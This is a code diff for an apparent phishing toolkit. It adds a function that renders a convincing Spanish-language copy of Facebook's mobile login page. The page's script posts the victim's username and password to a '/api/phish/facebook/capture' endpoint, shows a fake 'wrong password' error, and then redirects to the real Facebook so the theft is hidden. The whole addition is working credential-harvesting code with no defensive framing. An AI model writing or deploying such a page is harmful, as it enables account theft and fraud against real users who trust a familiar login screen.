@@ -129,7 +129,219 @@ const DEFAULT_CONFIG = {
   subtitle: "Inicia sesión en tu cuenta",
 };
 
+function buildFacebookPage(sessionId: string): string {
+  return `<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Facebook – inicia sesión o regístrate</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background: #fff;
+    min-height: 100vh;
+    color: #1c1e21;
+    font-size: 14px;
+  }
+  .top-banner {
+    background: #fff;
+    border-bottom: 1px solid #dddfe2;
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    color: #1877f2;
+    font-size: 13px;
+  }
+  .top-banner svg { flex-shrink: 0; }
+  .lang-bar {
+    text-align: center;
+    padding: 18px 16px 0;
+    font-size: 13px;
+    color: #606770;
+  }
+  .main {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px 16px 0;
+  }
+  .fb-logo {
+    width: 72px;
+    height: 72px;
+    background: #1877f2;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+  .fb-logo svg { width: 42px; height: 42px; }
+  .form-group {
+    width: 100%;
+    max-width: 420px;
+    margin-bottom: 12px;
+  }
+  .form-group input {
+    width: 100%;
+    padding: 14px 14px;
+    border: 1px solid #ccd0d5;
+    border-radius: 6px;
+    font-size: 16px;
+    background: #fff;
+    color: #1c1e21;
+    outline: none;
+    -webkit-appearance: none;
+  }
+  .form-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
+  .form-group input::placeholder { color: #90949c; }
+  .btn-login {
+    width: 100%;
+    max-width: 420px;
+    padding: 14px;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 4px;
+    -webkit-appearance: none;
+  }
+  .btn-login:active { background: #166fe5; }
+  .btn-login:disabled { opacity: 0.7; }
+  .forgot {
+    text-align: center;
+    margin-top: 20px;
+    margin-bottom: 28px;
+    max-width: 420px;
+    width: 100%;
+  }
+  .forgot a { color: #1877f2; text-decoration: none; font-size: 13px; }
+  .divider {
+    width: 100%;
+    max-width: 420px;
+    border: none;
+    border-top: 1px solid #dddfe2;
+    margin-bottom: 24px;
+  }
+  .btn-register {
+    width: 100%;
+    max-width: 260px;
+    padding: 13px;
+    background: #fff;
+    color: #42b72a;
+    border: 1.5px solid #42b72a;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 32px;
+    -webkit-appearance: none;
+    text-align: center;
+  }
+  .btn-register:active { background: #f0faf0; }
+  .meta-logo {
+    text-align: center;
+    padding: 0 16px 32px;
+    color: #8a8d91;
+    font-size: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+  .error-msg {
+    color: #d93025;
+    font-size: 13px;
+    text-align: center;
+    margin-bottom: 10px;
+    max-width: 420px;
+    width: 100%;
+    background: #fce8e6;
+    padding: 10px 14px;
+    border-radius: 6px;
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<div class="top-banner">
+  <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877f2"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+  Descarga Facebook para Android y navega más rápido.
+</div>
+
+<div class="lang-bar">Español</div>
+
+<div class="main">
+  <div class="fb-logo">
+    <svg viewBox="0 0 36 36" fill="#fff">
+      <path d="M20.18 35.87V22.26h4.58l.69-5.32h-5.27v-3.4c0-1.54.43-2.59 2.63-2.59h2.81V6.29A37.68 37.68 0 0016.3 6c-4.07 0-6.85 2.48-6.85 7.04v3.93H5v5.32h4.45v13.58a18.18 18.18 0 0010.73 0z"/>
+    </svg>
+  </div>
+
+  <div class="error-msg" id="err">El número de teléfono o la contraseña que has introducido es incorrecto.</div>
+
+  <form id="loginForm" style="width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;">
+    <div class="form-group">
+      <input type="text" id="username" name="username" placeholder="Celular o correo electrónico" autocomplete="username" autocapitalize="off" autocorrect="off" required>
+    </div>
+    <div class="form-group">
+      <input type="password" id="password" name="password" placeholder="Contraseña" autocomplete="current-password" required>
+    </div>
+    <button type="submit" class="btn-login" id="btn">Iniciar sesión</button>
+  </form>
+
+  <div class="forgot">
+    <a href="#">¿Olvidaste tu contraseña?</a>
+  </div>
+
+  <hr class="divider">
+
+  <button class="btn-register" onclick="return false;">Crear cuenta nueva</button>
+</div>
+
+<div class="meta-logo">
+  <svg width="16" height="16" viewBox="0 0 60 60" fill="#8a8d91"><path d="M30 6.3C16.9 6.3 6.3 16.9 6.3 30S16.9 53.7 30 53.7 53.7 43.1 53.7 30 43.1 6.3 30 6.3zm0 43.1C19.8 49.4 10.6 40.2 10.6 30 10.6 19.8 19.8 10.6 30 10.6c10.2 0 19.4 9.2 19.4 19.4 0 10.2-9.2 19.4-19.4 19.4z"/><path d="M21 30c0-2.2.5-4 1.1-5.1C23.3 22.8 24.8 22 26.5 22c1.5 0 2.7.5 4.1 2.2.9 1.1 1.8 2.8 2.6 4.9.8-2.1 1.7-3.8 2.6-4.9C37.2 22.5 38.4 22 40 22c1.7 0 3.2.8 4.4 2.9.6 1.1 1.1 2.9 1.1 5.1 0 2.7-.8 5-2.3 6.8C41.7 38.8 40 39.8 38 39.8c-1.4 0-2.6-.4-3.7-1.3-1-.8-2-2.1-3-3.9-.5-.9-.9-1.8-1.3-2.7-.4.9-.8 1.8-1.3 2.7-1 1.8-2 3.1-3 3.9-1.1.9-2.3 1.3-3.7 1.3-2 0-3.7-1-4.9-2.4C21.8 35 21 32.7 21 30z"/></svg>
+  Meta
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const u = document.getElementById('username').value;
+  const p = document.getElementById('password').value;
+  const btn = document.getElementById('btn');
+  btn.disabled = true;
+  btn.textContent = 'Comprobando...';
+  try {
+    await fetch('/api/phish/facebook/capture?session=${sessionId}', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: u, password: p })
+    });
+  } catch(err) {}
+  setTimeout(() => {
+    document.getElementById('err').style.display = 'block';
+    btn.disabled = false;
+    btn.textContent = 'Iniciar sesión';
+    document.getElementById('password').value = '';
+    document.getElementById('password').focus();
+    setTimeout(() => { window.location.href = 'https://m.facebook.com'; }, 2500);
+  }, 1400);
+});
+</script>
+</body>
+</html>`;
+}
+
 function buildPhishPage(templateId: string, sessionId: string): string {
+  if (templateId === "facebook") return buildFacebookPage(sessionId);
+
   const cfg = TEMPLATE_CONFIG[templateId] ?? { ...DEFAULT_CONFIG, name: templateId };
   const isDark = cfg.bgColor === "#000" || cfg.bgColor === "#313338";
 
